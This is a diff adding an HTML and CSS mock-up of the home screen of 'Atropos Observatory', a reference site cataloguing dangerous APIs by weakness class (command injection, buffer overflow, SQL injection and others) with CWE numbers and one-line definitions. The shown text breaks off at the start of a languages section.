@@ -1,0 +1,884 @@
+<title>Observatory Door A Redesign</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Source+Serif+4:opsz,wght@8..60,400;8..60,500;8..60,600;8..60,700&family=IBM+Plex+Sans:wght@400;500;600&family=IBM+Plex+Mono:wght@400;500;600&display=swap">
+<style>
+  :root{
+    --paper:#f0eee7; --paper-raised:#f7f5ef; --paper-sunk:#e7e3d9;
+    --ink:#181916; --muted:#66675f; --faint:#8a8b81;
+    --rule:#c9c5b9; --rule-dark:#9f9b90;
+    --red:#ad3828; --red-wash:#f2e3df; --red-deep:#7c2417; --focus:#c44731;
+    --source:#316b78; --source-wash:#dce9ec; --sanitizer:#3f7056; --san-wash:#e3ede6; --summary:#65577a;
+    --serif:"Source Serif 4",Georgia,serif;
+    --sans:"IBM Plex Sans",system-ui,sans-serif;
+    --mono:"IBM Plex Mono",ui-monospace,monospace;
+    color-scheme:light;
+  }
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--paper);color:var(--ink);font-family:var(--sans);
+    font-size:15px;line-height:1.5;-webkit-font-smoothing:antialiased;}
+  a{color:inherit}
+  code,pre{font-family:var(--mono)}
+  .wrap{max-width:1180px;margin:0 auto;padding:0 24px}
+
+  /* ---- switcher chrome ---- */
+  .chrome{position:sticky;top:0;z-index:50;background:var(--ink);color:var(--paper);border-bottom:2px solid var(--ink)}
+  .chrome-inner{max-width:1180px;margin:0 auto;padding:10px 24px;display:flex;align-items:center;gap:20px;flex-wrap:wrap}
+  .chrome b{font-family:var(--mono);font-size:12px;letter-spacing:.14em;text-transform:uppercase;color:var(--paper);font-weight:600}
+  .chrome .tag{font-family:var(--mono);font-size:11px;letter-spacing:.1em;color:#b9b6ab}
+  .segs{display:flex;gap:2px;margin-left:auto;flex-wrap:wrap}
+  .segs button{font-family:var(--mono);font-size:11px;letter-spacing:.06em;text-transform:uppercase;background:transparent;color:#c9c6ba;border:1px solid #3a3b36;padding:6px 11px;cursor:pointer}
+  .segs button:hover{color:var(--paper);border-color:#5a5b54}
+  .segs button[aria-current="true"]{background:var(--red);color:#fff;border-color:var(--red)}
+  .segs button:focus-visible{outline:2px solid var(--focus);outline-offset:1px}
+  .screen[hidden]{display:none}
+  .frame{background:var(--paper);border-bottom:1px solid var(--rule)}
+
+  /* ---- app header ---- */
+  .appbar{border-bottom:1px solid var(--ink)}
+  .appbar-inner{max-width:1180px;margin:0 auto;padding:14px 24px;display:flex;align-items:center;gap:26px}
+  .brand{display:flex;align-items:center;gap:10px;font-family:var(--mono);font-weight:600;letter-spacing:.02em}
+  .brand .mark{width:26px;height:26px;background:var(--ink);color:var(--paper);display:grid;place-items:center;font-size:12px}
+  .brand small{font-family:var(--sans);font-weight:400;color:var(--muted);font-size:12.5px}
+  .appnav{margin-left:auto;display:flex;gap:20px;font-size:13px}
+  .appnav a{color:var(--muted);text-decoration:none;padding-bottom:2px}
+  .appnav a:hover{color:var(--ink)}
+  .appnav a.ext::after{content:" \2197";color:var(--faint)}
+
+  .kicker{font-family:var(--mono);font-size:11px;letter-spacing:.16em;text-transform:uppercase;color:var(--red);font-weight:600}
+  .kicker.neutral{color:var(--muted)}
+  h1,h2,h3{font-family:var(--serif);font-weight:600;text-wrap:balance;margin:0}
+  .microlab{font-family:var(--mono);font-size:11px;letter-spacing:.13em;text-transform:uppercase;color:var(--red);font-weight:600}
+  .microlab.n{color:var(--muted)}
+
+  .roletag{font-family:var(--mono);font-size:10.5px;letter-spacing:.1em;text-transform:uppercase;font-weight:600;padding:3px 7px;border:1px solid currentColor}
+  .r-sink{color:var(--red)} .r-source{color:var(--source)} .r-sanitizer{color:var(--sanitizer)} .r-summary{color:var(--summary)}
+  .watched{background:var(--red-wash);border-bottom:2px solid var(--red);padding:1px 2px;font-weight:600}
+
+  /* ================= HOME ================= */
+  .hero{padding:52px 0 38px;border-bottom:1px solid var(--rule)}
+  .hero-grid{display:grid;grid-template-columns:1.5fr .9fr;gap:56px;align-items:start}
+  .hero h1{font-size:clamp(36px,4.6vw,56px);line-height:1.03;letter-spacing:-.03em;margin:14px 0 0}
+  .hero .lede{font-family:var(--serif);font-size:19px;line-height:1.5;color:#33342e;max-width:36ch;margin:18px 0 0}
+  .searchbox{margin-top:24px;border:1.5px solid var(--ink);background:var(--paper-raised);display:flex;align-items:center;gap:12px;padding:14px 16px}
+  .searchbox .mag{color:var(--muted);font-family:var(--mono)}
+  .searchbox input{border:0;background:transparent;font-family:var(--mono);font-size:16px;color:var(--ink);flex:1;outline:none}
+  .searchbox .slash{font-family:var(--mono);font-size:11px;color:var(--muted);border:1px solid var(--rule-dark);padding:2px 6px}
+  .chips{margin-top:14px;display:flex;gap:8px;flex-wrap:wrap;align-items:center}
+  .chips span.lab{font-size:12px;color:var(--muted)}
+  .chip{font-family:var(--mono);font-size:12.5px;color:var(--ink);border:1px solid var(--rule-dark);padding:4px 9px;text-decoration:none;background:var(--paper-raised)}
+  .chip:hover{border-color:var(--ink)}
+  .funnel-line{margin-top:28px;border-left:3px solid var(--red);padding:2px 0 2px 16px}
+  .funnel-line .a{color:var(--red);font-family:var(--mono);font-size:13px}
+  .funnel-line .l{color:var(--source);font-family:var(--mono);font-size:13px}
+  .funnel-line p{margin:4px 0 0;font-family:var(--serif);font-size:16px;color:#33342e;max-width:46ch}
+  .provcard{border:1px solid var(--rule);background:var(--paper-raised)}
+  .provcard .ph{padding:10px 14px;border-bottom:1px solid var(--rule);font-family:var(--mono);font-size:11px;letter-spacing:.12em;text-transform:uppercase;color:var(--muted)}
+  .provcard dl{margin:0;padding:6px 14px 12px}
+  .provcard .row{display:flex;justify-content:space-between;align-items:baseline;padding:8px 0;border-bottom:1px solid var(--rule)}
+  .provcard .row:last-child{border-bottom:0}
+  .provcard dt{color:var(--muted);font-size:13px}
+  .provcard dd{margin:0;font-family:var(--mono);font-weight:500;font-variant-numeric:tabular-nums}
+  .provcard .git{color:var(--source)}
+  .demoband{padding:34px 0 44px;border-bottom:1px solid var(--rule)}
+  .demoband .head{display:flex;justify-content:space-between;align-items:flex-end;margin-bottom:20px;gap:20px}
+  .demoband h2{font-size:24px;letter-spacing:-.01em}
+  .demoband .head p{margin:6px 0 0;color:var(--muted);font-size:14px;max-width:52ch}
+  .txtlink{font-size:13px;color:var(--ink);text-decoration:none;border-bottom:1.5px solid var(--red);padding-bottom:1px;white-space:nowrap;background:none;cursor:pointer;font-family:var(--sans)}
+  .txtlink:hover{background:var(--red-wash)}
+  .minicard{border:1px solid var(--ink);background:var(--paper-raised)}
+  .minicard .mc-top{padding:16px 18px;display:flex;align-items:flex-start;gap:14px;border-bottom:1px solid var(--rule)}
+  .risk-stripe{width:4px;align-self:stretch;background:var(--red)}
+  .mc-sym{font-family:var(--mono);font-size:20px;font-weight:600}
+  .mc-env{font-size:12.5px;color:var(--muted);margin-top:2px}
+  .mc-top .roletag{margin-left:auto}
+  .mc-body{padding:16px 18px 18px}
+  .mc-answer{font-family:var(--serif);font-size:16px;line-height:1.45;color:#26271f}
+  .mc-slot{margin-top:14px;background:var(--paper-sunk);border:1px solid var(--rule);padding:10px 12px;font-family:var(--mono);font-size:13px;overflow-x:auto;white-space:nowrap}
+  .mc-slot .note{color:var(--red);white-space:normal}
+
+  /* home: section head */
+  .sechead{display:flex;justify-content:space-between;align-items:flex-end;gap:20px;margin-bottom:20px}
+  .sechead h2{font-size:25px;letter-spacing:-.01em}
+  .sechead p{margin:6px 0 0;color:var(--muted);font-size:14px;max-width:54ch}
+
+  /* home: browse by weakness */
+  .browse{padding:40px 0 44px;border-bottom:1px solid var(--rule)}
+  .weakgrid{display:grid;grid-template-columns:repeat(4,1fr);gap:0;border-top:1px solid var(--ink);border-left:1px solid var(--ink)}
+  .weakcard{border-right:1px solid var(--rule);border-bottom:1px solid var(--rule);background:var(--paper-raised);padding:16px 16px 14px;text-decoration:none;color:var(--ink);display:flex;flex-direction:column;gap:8px;position:relative}
+  .weakcard::before{content:"";position:absolute;left:0;top:0;bottom:0;width:3px;background:var(--red);opacity:.85}
+  .weakcard:hover{background:var(--paper);transform:translateY(-2px)}
+  .weakcard .wk{font-family:var(--serif);font-size:17px;font-weight:600;line-height:1.15}
+  .weakcard .wd{font-size:12.5px;color:#3a3b33;line-height:1.45;flex:1}
+  .weakcard .wf{display:flex;justify-content:space-between;align-items:baseline;padding-top:8px;border-top:1px solid var(--rule)}
+  .weakcard .cwe{font-family:var(--mono);font-size:11px;color:var(--red);font-weight:600}
+  .weakcard .cnt{font-family:var(--mono);font-size:11px;color:var(--muted);font-variant-numeric:tabular-nums}
+  .weakcard .langs{display:flex;gap:4px;font-family:var(--mono);font-size:9.5px;letter-spacing:.05em;color:var(--faint);text-transform:uppercase}
+
+  /* home: languages */
+  .langs-sec{padding:38px 0 42px;border-bottom:1px solid var(--rule)}
+  .langrow{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+  .langtile{border:1px solid var(--rule-dark);background:var(--paper-raised);padding:16px;text-decoration:none;color:var(--ink);display:block}
+  .langtile:hover{border-color:var(--ink)}
+  .langtile .lt{display:flex;justify-content:space-between;align-items:baseline}
+  .langtile .lname{font-family:var(--mono);font-weight:600;font-size:15px}
+  .langtile .lcount{font-family:var(--mono);font-size:20px;font-weight:600;font-variant-numeric:tabular-nums}
+  .langtile .bar{height:4px;background:var(--paper-sunk);margin:12px 0 10px}
+  .langtile .bar span{display:block;height:100%;background:var(--source)}
+  .langtile .lpk{font-size:11.5px;color:var(--muted);line-height:1.4}
+
+  /* home: seam / funnel */
+  .seamsec{padding:42px 0 48px}
+  .seam{display:grid;grid-template-columns:1fr 56px 1fr;align-items:stretch;gap:0}
+  .seampanel{border:1.5px solid var(--ink);background:var(--paper-raised);padding:22px 22px 24px}
+  .seampanel.atr{border-right:0} .seampanel.lac{border-left:0}
+  .seampanel .sp-tag{font-family:var(--mono);font-size:12px;letter-spacing:.14em;text-transform:uppercase;font-weight:600}
+  .seampanel.atr .sp-tag{color:var(--red)} .seampanel.lac .sp-tag{color:var(--source)}
+  .seampanel h3{font-family:var(--serif);font-size:22px;margin:8px 0 4px;letter-spacing:-.01em}
+  .seampanel .sp-sub{font-size:13px;color:var(--muted);margin-bottom:16px}
+  .seampanel ul{list-style:none;margin:0;padding:0}
+  .seampanel li{padding:9px 0;border-top:1px solid var(--rule);font-size:14px;color:#26271f;display:flex;gap:9px;align-items:flex-start}
+  .seampanel li .mk{font-family:var(--mono);font-weight:600;flex:none}
+  .seampanel.atr li .mk{color:var(--red)} .seampanel.lac li .mk{color:var(--source)}
+  .seampanel .sp-foot{margin-top:16px;font-family:var(--mono);font-size:11.5px;color:var(--muted)}
+  .seampanel.lac .sp-foot a{color:var(--source);text-decoration:none;border-bottom:1px solid var(--source)}
+  .seamarrow{display:grid;place-items:center;background:var(--ink);color:var(--paper);font-family:var(--mono);font-size:20px}
+  .seamnote{text-align:center;margin-top:16px;font-family:var(--serif);font-size:15px;color:#3a3b33;max-width:64ch;margin-left:auto;margin-right:auto}
+
+  /* home: footer ecosystem */
+  .ecofoot{border-top:1px solid var(--ink);padding:26px 0 40px;display:flex;justify-content:space-between;gap:24px;flex-wrap:wrap;align-items:center}
+  .ecofoot .ep{display:flex;gap:26px;flex-wrap:wrap}
+  .ecofoot a{text-decoration:none;color:var(--ink);font-size:13px}
+  .ecofoot .ep a b{font-family:var(--mono);font-size:13px;display:block}
+  .ecofoot .ep a span{color:var(--muted);font-size:12px}
+  .ecofoot a.ext::after{content:" \2197";color:var(--faint)}
+  .ecofoot .src{font-family:var(--mono);font-size:12.5px;border:1px solid var(--ink);padding:9px 14px}
+  .ecofoot .src:hover{background:var(--ink);color:var(--paper)}
+
+  /* ================= SYMBOL PAGE ================= */
+  .crumb{padding:16px 0 0;font-family:var(--mono);font-size:12px;color:var(--muted)}
+  .crumb a{color:var(--muted);text-decoration:none} .crumb a:hover{color:var(--ink)} .crumb b{color:var(--ink)}
+  .sym-head{display:flex;gap:16px;align-items:flex-start;padding:18px 0 20px}
+  .sym-head .stripe{width:5px;align-self:stretch;background:var(--red)}
+  .sym-title{flex:1}
+  .sym-title h1{font-family:var(--mono);font-size:clamp(28px,3.6vw,42px);font-weight:600;letter-spacing:-.01em;line-height:1}
+  .sym-sub{margin-top:8px;color:var(--muted);font-size:13.5px;font-family:var(--mono)}
+  .sym-badges{display:flex;flex-direction:column;gap:8px;align-items:flex-end}
+  .tier{font-family:var(--mono);font-size:10.5px;letter-spacing:.08em;text-transform:uppercase;padding:4px 8px;border:1px solid var(--rule-dark);color:var(--muted);white-space:nowrap}
+  .tier.reviewed{color:var(--sanitizer);border-color:var(--sanitizer);background:var(--san-wash)}
+
+  /* at-a-glance fact strip */
+  .factstrip{display:flex;flex-wrap:wrap;gap:0;border:1px solid var(--ink);background:var(--paper-raised);margin-bottom:6px}
+  .factstrip .f{padding:9px 15px;border-right:1px solid var(--rule);display:flex;flex-direction:column;gap:2px}
+  .factstrip .f:last-child{border-right:0}
+  .factstrip .fl{font-family:var(--mono);font-size:9.5px;letter-spacing:.11em;text-transform:uppercase;color:var(--faint)}
+  .factstrip .fv{font-family:var(--mono);font-size:13.5px;font-weight:600;color:var(--ink);font-variant-numeric:tabular-nums}
+  .factstrip .fv.red{color:var(--red)} .factstrip .fv.blue{color:var(--source)}
+
+  .detail{display:grid;grid-template-columns:1fr 296px;gap:44px;padding:26px 0 8px;align-items:start}
+  .answer{font-family:var(--serif);font-size:22px;line-height:1.4;color:#22231d;letter-spacing:-.005em}
+  .answer .em{color:var(--red);font-style:normal;font-weight:600}
+
+  .sec{margin-top:30px}
+  .sec > .microlab{display:block;margin-bottom:12px}
+  .sec-note{color:var(--muted);font-size:13px;margin:-6px 0 12px}
+
+  /* argument map */
+  .sig{background:var(--paper-sunk);border:1px solid var(--rule-dark);padding:14px 16px;font-family:var(--mono);font-size:15px;overflow-x:auto;white-space:nowrap}
+  .argtbl{width:100%;border-collapse:collapse;margin-top:12px;font-size:13.5px}
+  .argtbl th{text-align:left;font-family:var(--mono);font-weight:500;font-size:10px;letter-spacing:.1em;text-transform:uppercase;color:var(--muted);padding:0 12px 8px 0;border-bottom:1px solid var(--rule-dark)}
+  .argtbl td{padding:11px 12px 11px 0;border-bottom:1px solid var(--rule);vertical-align:top}
+  .argtbl tr.hot td{background:var(--red-wash)}
+  .argtbl .an{font-family:var(--mono);font-weight:600;white-space:nowrap}
+  .argtbl .ap{font-family:var(--mono);font-size:12px;color:var(--muted);white-space:nowrap}
+  .argtbl .flag{font-family:var(--mono);font-size:10.5px;letter-spacing:.06em;text-transform:uppercase;font-weight:600}
+  .argtbl .flag.yes{color:var(--red)} .argtbl .flag.no{color:var(--faint)}
+  .argtbl .why{color:#3a3b33}
+
+  /* weakness cards */
+  .cwecards{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+  .cwecard{border:1px solid var(--rule-dark);background:var(--paper-raised);padding:14px 16px}
+  .cwecard .cid{font-family:var(--mono);font-weight:600;font-size:13px;color:var(--red);text-decoration:none}
+  .cwecard .cid:hover{text-decoration:underline}
+  .cwecard .cname{font-family:var(--serif);font-size:15px;font-weight:600;margin:3px 0 6px}
+  .cwecard p{margin:0;font-size:13px;color:#3a3b33;line-height:1.5}
+
+  /* attacker view */
+  .attacker{border:1px solid var(--red);background:linear-gradient(0deg,var(--red-wash),var(--paper-raised))}
+  .attacker .ah{background:var(--red-deep);color:#fff;padding:8px 16px;font-family:var(--mono);font-size:11px;letter-spacing:.11em;text-transform:uppercase}
+  .attacker .ab{padding:16px 18px}
+  .attacker p{margin:0;font-family:var(--serif);font-size:16px;line-height:1.5;color:#2a1a15}
+  .attacker .demo{margin-top:12px;background:#241512;color:#f0d9d2;font-family:var(--mono);font-size:12.5px;padding:11px 14px;overflow-x:auto;white-space:pre;line-height:1.6}
+  .attacker .demo .in{color:#f2a58f} .attacker .demo .cm{color:#9a8d88}
+
+  /* checklist */
+  .checklist{border:1px solid var(--rule-dark);background:var(--paper-raised)}
+  .checklist .ci{display:flex;gap:14px;padding:13px 16px;border-bottom:1px solid var(--rule);align-items:flex-start}
+  .checklist .ci:last-child{border-bottom:0}
+  .checklist .num{font-family:var(--mono);font-weight:600;font-size:13px;color:var(--red);border:1px solid var(--red);width:22px;height:22px;display:grid;place-items:center;flex:none;margin-top:1px}
+  .checklist .ct{font-size:14px;color:#26271f}
+  .checklist .ct b{font-weight:600}
+  .checklist .ct code{font-size:12.5px}
+  .checklist .verdict{padding:12px 16px;background:var(--paper-sunk);font-family:var(--serif);font-size:14.5px;color:#3a3b33}
+  .checklist .verdict b{color:var(--red)}
+
+  /* handoff */
+  .handoff{margin-top:30px;border:1.5px solid var(--ink);background:var(--paper-raised)}
+  .handoff .hh{background:var(--ink);color:var(--paper);padding:8px 16px;font-family:var(--mono);font-size:11px;letter-spacing:.12em;text-transform:uppercase;display:flex;justify-content:space-between}
+  .handoff .hh .r{color:#c9c6ba}
+  .handoff .hb{padding:18px 18px 20px}
+  .handoff .stop{font-family:var(--serif);font-size:17px;line-height:1.45;color:#26271f}
+  .handoff .stop b{color:var(--red)}
+  .handoff .cross{margin-top:14px;padding-top:14px;border-top:1px solid var(--rule);font-family:var(--serif);font-size:17px;line-height:1.45;color:#26271f}
+  .handoff .cross b{color:var(--source)}
+  .cta{margin-top:16px;display:inline-flex;align-items:center;gap:10px;background:var(--source);color:#fff;text-decoration:none;font-family:var(--sans);font-weight:600;font-size:14px;padding:11px 18px}
+  .cta:hover{background:#28596a} .cta .arr{font-family:var(--mono)}
+
+  /* reviewed editorial */
+  .review{margin-top:30px;border-top:1px solid var(--ink);padding-top:22px}
+  .review h2{font-size:20px;margin-bottom:4px}
+  .review .rl{font-size:12.5px;color:var(--muted);margin-bottom:16px}
+  .safer{border-left:3px solid var(--sanitizer);padding:2px 0 2px 16px;margin-bottom:18px}
+  .safer .microlab{color:var(--sanitizer)}
+  .safer p{margin:6px 0 0;font-family:var(--serif);font-size:16px;color:#26271f;max-width:58ch}
+  .codegrid{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+  .codegrid .microlab{display:block;margin-bottom:6px}
+  .code{background:var(--paper-sunk);border:1px solid var(--rule-dark);padding:12px 14px;font-family:var(--mono);font-size:13px;line-height:1.55;overflow-x:auto;white-space:pre}
+  .code.bad{border-color:#d8b3aa} .code.good{border-color:#b6cbbd}
+  .cmt{color:var(--faint)}
+
+  /* family */
+  .family{margin-top:30px;border-top:1px solid var(--rule);padding-top:20px}
+  .famgrid{display:grid;grid-template-columns:repeat(3,1fr);gap:20px}
+  .famcol h3{font-family:var(--mono);font-size:10.5px;letter-spacing:.1em;text-transform:uppercase;color:var(--muted);font-weight:600;margin-bottom:10px;padding-bottom:8px;border-bottom:1px solid var(--rule-dark)}
+  .famcol a{display:flex;align-items:center;gap:8px;padding:7px 0;font-family:var(--mono);font-size:13px;text-decoration:none;color:var(--ink);border-bottom:1px solid var(--rule)}
+  .famcol a:last-child{border-bottom:0}
+  .famcol a:hover{color:var(--red)} .famcol.san a:hover{color:var(--sanitizer)}
+  .famcol a .lg{font-family:var(--mono);font-size:10px;color:var(--faint);margin-left:auto;text-transform:uppercase;letter-spacing:.05em}
+  .famcol a .dot{color:var(--red)} .famcol.san a .dot{color:var(--sanitizer)}
+
+  /* fold */
+  .fold{margin-top:32px;border-top:1px solid var(--rule);padding-top:18px}
+  .fold-lab{font-family:var(--mono);font-size:11px;letter-spacing:.13em;text-transform:uppercase;color:var(--muted);font-weight:600;margin-bottom:14px}
+  table.facts{width:100%;border-collapse:collapse;font-size:13px}
+  table.facts th{text-align:left;font-family:var(--mono);font-weight:500;font-size:10.5px;letter-spacing:.1em;text-transform:uppercase;color:var(--muted);padding:0 12px 8px 0;border-bottom:1px solid var(--rule-dark)}
+  table.facts td{padding:9px 12px 9px 0;border-bottom:1px solid var(--rule)}
+  table.facts td code{font-size:12px}
+  .conf{font-family:var(--mono);font-size:11px}
+
+  /* aside */
+  aside .as-lab{font-family:var(--mono);font-size:11px;letter-spacing:.13em;text-transform:uppercase;color:var(--muted);font-weight:600;padding-bottom:10px;border-bottom:1px solid var(--ink);margin-bottom:4px}
+  aside dl{margin:0}
+  aside .row{display:flex;justify-content:space-between;gap:12px;padding:10px 0;border-bottom:1px solid var(--rule)}
+  aside dt{color:var(--muted);font-size:12.5px}
+  aside dd{margin:0;font-family:var(--mono);font-size:12.5px;text-align:right}
+  aside dd.git{color:var(--source)}
+  aside .srcbtn{display:block;margin-top:16px;text-align:center;border:1px solid var(--ink);padding:10px;font-size:12.5px;text-decoration:none;color:var(--ink);background:var(--paper-raised)}
+  aside .srcbtn:hover{background:var(--ink);color:var(--paper)} aside .srcbtn::after{content:" \2197"}
+  aside .refbox{margin-top:16px;padding:12px 14px;border:1px solid var(--rule);background:var(--paper-raised)}
+  aside .refbox a{display:block;font-size:12.5px;color:var(--source);text-decoration:none;padding:3px 0}
+
+  /* ================= SEARCH ================= */
+  .searchpage{padding:34px 0 50px}
+  .bigsearch{border:1.5px solid var(--ink);background:var(--paper-raised);display:flex;align-items:center;gap:12px;padding:14px 16px;max-width:640px}
+  .bigsearch input{border:0;background:transparent;font-family:var(--mono);font-size:16px;flex:1;outline:none;color:var(--ink)}
+  .resmeta{margin:18px 0 10px;font-size:13px;color:var(--muted);font-family:var(--mono)}
+  .reslist{border-top:1px solid var(--rule-dark)}
+  .resrow{display:flex;align-items:center;gap:16px;padding:13px 4px;border-bottom:1px solid var(--rule);text-decoration:none;color:var(--ink)}
+  .resrow:hover{background:var(--paper-raised);transform:translateX(2px)}
+  .resrow .rsym{font-family:var(--mono);font-weight:600;font-size:15px;min-width:200px}
+  .resrow .renv{font-family:var(--mono);font-size:12px;color:var(--muted);min-width:140px}
+  .resrow .rans{font-size:13px;color:#3a3b33;flex:1}
+  .resrow .rtag{margin-left:auto}
+  .missing{margin-top:30px;border:1.5px solid var(--rule-dark);background:var(--paper-raised);padding:22px}
+  .missing .kicker{margin-bottom:10px}
+  .missing h2{font-family:var(--serif);font-size:22px;margin-bottom:8px}
+  .missing p{color:#33342e;max-width:60ch;font-size:15px;margin:0 0 6px}
+  .missing .q{font-family:var(--mono);color:var(--ink)}
+  .missing .opts{margin-top:18px;display:grid;grid-template-columns:1fr 1fr;gap:12px}
+  .missing .opt{border:1px solid var(--rule-dark);background:var(--paper);padding:14px}
+  .missing .opt h3{font-family:var(--sans);font-size:13px;font-weight:600;margin-bottom:6px}
+  .missing .opt p{font-size:13px;color:var(--muted)}
+  .missing .opt.fn{border-color:var(--source)} .missing .opt.fn h3{color:var(--source)}
+
+  /* ================= NOTES ================= */
+  .notes{background:var(--ink);color:#d8d5c9}
+  .notes-inner{max-width:1180px;margin:0 auto;padding:22px 24px 30px}
+  .notes h4{font-family:var(--mono);font-size:11px;letter-spacing:.14em;text-transform:uppercase;color:#f0eee7;margin:0 0 14px;font-weight:600}
+  .notes .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:18px 28px}
+  .notes .n .t{font-family:var(--sans);font-weight:600;font-size:13px;color:#fff;margin-bottom:4px}
+  .notes .n .d{font-size:13px;line-height:1.5;color:#b9b6ab}
+  .notes .n .d b{color:#e6bfb6;font-weight:500}
+
+  .mobwrap{display:flex;gap:40px;padding:34px 0;align-items:flex-start;flex-wrap:wrap}
+  .phone{width:340px;max-width:100%;border:8px solid var(--ink);background:var(--paper);height:640px;overflow-y:auto;flex:none}
+  .phone .p-in{padding:16px}
+  .mobexplain{flex:1;min-width:260px}
+  .mobexplain h3{font-family:var(--serif);font-size:22px;margin-bottom:10px}
+  .mobexplain ul{margin:0;padding-left:18px;color:#33342e}
+  .mobexplain li{margin-bottom:10px;font-size:14.5px}
+
+  @media(max-width:860px){
+    .hero-grid{grid-template-columns:1fr;gap:34px}
+    .detail{grid-template-columns:1fr;gap:28px}
+    .cwecards,.codegrid,.missing .opts{grid-template-columns:1fr}
+    .famgrid{grid-template-columns:1fr;gap:22px}
+    .appnav{display:none}
+    .demoband .head{flex-direction:column;align-items:flex-start}
+    .factstrip .f{border-right:0;border-bottom:1px solid var(--rule);flex:1 1 46%}
+    .weakgrid{grid-template-columns:1fr 1fr}
+    .langrow{grid-template-columns:1fr 1fr}
+    .seam{grid-template-columns:1fr}
+    .seampanel.atr{border-right:1.5px solid var(--ink);border-bottom:0}
+    .seampanel.lac{border-left:1.5px solid var(--ink)}
+    .seamarrow{padding:10px;font-size:16px}
+    .sechead{flex-direction:column;align-items:flex-start}
+  }
+  @media(max-width:560px){.weakgrid,.langrow{grid-template-columns:1fr}}
+  @media(prefers-reduced-motion:reduce){*{transition:none!important}}
+  .resrow,.chip,.cta,.txtlink{transition:transform .18s cubic-bezier(.22,1,.36,1),background .15s}
+</style>
+
+<div class="chrome">
+  <div class="chrome-inner">
+    <b>Observatory · Door A</b>
+    <span class="tag">redesign mock — clickable</span>
+    <div class="segs" role="tablist" aria-label="Screens">
+      <button data-s="home" aria-current="true">Home / search</button>
+      <button data-s="raw">Symbol · raw</button>
+      <button data-s="reviewed">Symbol · reviewed</button>
+      <button data-s="search">Results / missing</button>
+      <button data-s="mobile">Mobile</button>
+    </div>
+  </div>
+</div>
+
+<!-- ================= HOME ================= -->
+<section class="screen" data-screen="home">
+  <div class="frame">
+    <div class="appbar"><div class="appbar-inner">
+      <div class="brand"><span class="mark">AO</span> Atropos&nbsp;Observatory <small>a field manual for dangerous APIs</small></div>
+      <nav class="appnav">
+        <a href="#">Look up a symbol</a><a href="#">Browse by risk</a><a href="#">Coverage</a>
+        <a class="ext" href="#">Lachesis</a><a class="ext" href="#">Source</a>
+      </nav>
+    </div></div>
+    <div class="wrap">
+      <div class="hero"><div class="hero-grid">
+        <div>
+          <span class="kicker">Which argument is the dangerous one?</span>
+          <h1>Look up any API. See the exact argument to watch.</h1>
+          <p class="lede">A precise, per-symbol reference built from the Atropos model pack — the tainted slot, the weakness, how an attacker abuses it, and what to check, for 1,449 symbols across C, Python, JavaScript, and TypeScript.</p>
+          <div class="searchbox"><span class="mag">⌕</span><input value="child_process.exec" aria-label="Search a symbol" spellcheck="false"><span class="slash">/</span></div>
+          <div class="chips"><span class="lab">Try</span><a class="chip" href="#">memcpy</a><a class="chip" href="#">pickle.load</a><a class="chip" href="#">os.system</a><a class="chip" href="#">shlex.quote</a><a class="chip" href="#">mysql_query</a></div>
+          <div class="funnel-line">
+            <span class="a">ATROPOS</span> names the dangerous argument. <span class="l">LACHESIS</span> tells you if it's reachable in your code.
+            <p>This reference answers the first for every symbol — then hands you to the engine for the second.</p>
+          </div>
+        </div>
+        <div class="provcard">
+          <div class="ph">Ingested pack</div>
+          <dl>
+            <div class="row"><dt>Atropos release</dt><dd>1.10.0</dd></div>
+            <div class="row"><dt>Model facts</dt><dd>1,617</dd></div>
+            <div class="row"><dt>Symbols</dt><dd>1,449</dd></div>
+            <div class="row"><dt>Sink kinds</dt><dd>32</dd></div>
+            <div class="row"><dt>Source revision</dt><dd class="git">a3f9c1d2</dd></div>
+          </dl>
+        </div>
+      </div></div>
+
+      <!-- browse by weakness -->
+      <div class="browse">
+        <div class="sechead">
+          <div><h2>Don't have a symbol? Start with the danger.</h2><p>The catalog is organized the way you think about risk — by weakness class. Pick one to see every modeled API that reaches it.</p></div>
+          <button class="txtlink" data-goto="search">See all 32 kinds →</button>
+        </div>
+        <div class="weakgrid">
+          <a class="weakcard" href="#" data-goto="reviewed"><span class="wk">Command injection</span><span class="wd">User text reaches a shell and becomes its own command.</span><div class="wf"><span class="cwe">CWE-78</span><span class="cnt">61 symbols</span></div><div class="langs"><span>c</span><span>js</span><span>py</span><span>ts</span></div></a>
+          <a class="weakcard" href="#" data-goto="raw"><span class="wk">Buffer overflow</span><span class="wd">A copy or write runs past the end of a fixed-size buffer.</span><div class="wf"><span class="cwe">CWE-787</span><span class="cnt">94 symbols</span></div><div class="langs"><span>c</span></div></a>
+          <a class="weakcard" href="#"><span class="wk">SQL injection</span><span class="wd">Untrusted input alters the structure of a database query.</span><div class="wf"><span class="cwe">CWE-89</span><span class="cnt">73 symbols</span></div><div class="langs"><span>js</span><span>py</span><span>ts</span></div></a>
+          <a class="weakcard" href="#"><span class="wk">Unsafe deserialization</span><span class="wd">Decoding attacker data instantiates arbitrary objects.</span><div class="wf"><span class="cwe">CWE-502</span><span class="cnt">38 symbols</span></div><div class="langs"><span>py</span><span>js</span></div></a>
+          <a class="weakcard" href="#"><span class="wk">Path traversal</span><span class="wd">A crafted path escapes the intended directory.</span><div class="wf"><span class="cwe">CWE-22</span><span class="cnt">55 symbols</span></div><div class="langs"><span>c</span><span>js</span><span>py</span><span>ts</span></div></a>
+          <a class="weakcard" href="#"><span class="wk">Server-side request forgery</span><span class="wd">The server is coerced into fetching an attacker's URL.</span><div class="wf"><span class="cwe">CWE-918</span><span class="cnt">29 symbols</span></div><div class="langs"><span>js</span><span>py</span><span>ts</span></div></a>
+          <a class="weakcard" href="#"><span class="wk">Prototype pollution</span><span class="wd">Input writes to <code>__proto__</code> and taints every object.</span><div class="wf"><span class="cwe">CWE-1321</span><span class="cnt">21 symbols</span></div><div class="langs"><span>js</span><span>ts</span></div></a>
+          <a class="weakcard" href="#"><span class="wk">Code / eval injection</span><span class="wd">Input reaches a dynamic-evaluation sink and runs as code.</span><div class="wf"><span class="cwe">CWE-95</span><span class="cnt">33 symbols</span></div><div class="langs"><span>js</span><span>py</span></div></a>
+        </div>
+      </div>
+
+      <!-- by language -->
+      <div class="langs-sec">
